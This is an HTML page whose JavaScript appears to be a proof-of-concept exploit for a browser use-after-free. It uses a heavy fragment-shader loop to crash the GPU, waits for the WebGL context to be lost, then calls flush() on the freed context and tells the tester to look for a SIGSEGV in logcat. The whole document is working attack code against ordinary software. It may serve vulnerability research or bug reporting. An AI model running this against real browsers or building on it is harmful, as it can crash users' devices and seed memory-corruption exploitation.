<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => {
  document.getElementById('log').textContent += msg + '\n';
  console.log(msg);
};

async function main() {
  // 1. Create a WebGL context and keep it alive
  const canvas = document.createElement('canvas');
  canvas.width = canvas.height = 1;
  document.body.appendChild(canvas);
  const gl = canvas.getContext('webgl2', { preserveDrawingBuffer: true });
  if (!gl) {
    log('WebGL2 not available');
    return;
  }
  log('Created WebGL context.');

  // 2. Crash the GPU using your shader
  function triggerGpuCrash() {
    // Your exact shader crash code (simplified)
    const offscreen = new OffscreenCanvas(256, 256);
    const gl2 = offscreen.getContext('webgl2', { powerPreference: 'high-performance' });
    if (!gl2) return;
    // Use a heavy shader loop to kill GPU
    const vSrc = `attribute vec4 p;void main(){gl_Position=p;}`;
    const fSrc = `precision highp float;void main(){for(int i=0;i<100000;i++){gl_FragColor=vec4(float(i));}}`;
    const vs = gl2.createShader(gl2.VERTEX_SHADER);
    gl2.shaderSource(vs, vSrc); gl2.compileShader(vs);
    const fs = gl2.createShader(gl2.FRAGMENT_SHADER);
    gl2.shaderSource(fs, fSrc); gl2.compileShader(fs);
    const prog = gl2.createProgram();
    gl2.attachShader(prog, vs); gl2.attachShader(prog, fs);
    gl2.linkProgram(prog); gl2.useProgram(prog);
    gl2.drawArrays(gl2.TRIANGLES, 0, 3);
  }
  log('Triggering GPU crash...');
  triggerGpuCrash();

  // 3. Wait for GPU to die
  while (!gl.isContextLost()) {
    await new Promise(r => setTimeout(r, 100));
  }
  log('GPU context lost – browser is cleaning up.');

  // 4. Wait a tiny bit to let the browser start destroying the stub
  await new Promise(r => setTimeout(r, 50));

  // 5. Try to use the old context – this will send a message to a freed stub
  log('Sending gl.flush() to trigger UAF...');
  try {
    gl.flush();
  } catch(e) {
    log('Exception: ' + e.message);
  }
  log('Done. Check logcat for browser crash (SIGSEGV or DCHECK).');
}
main();
</script>
</body>
</html>
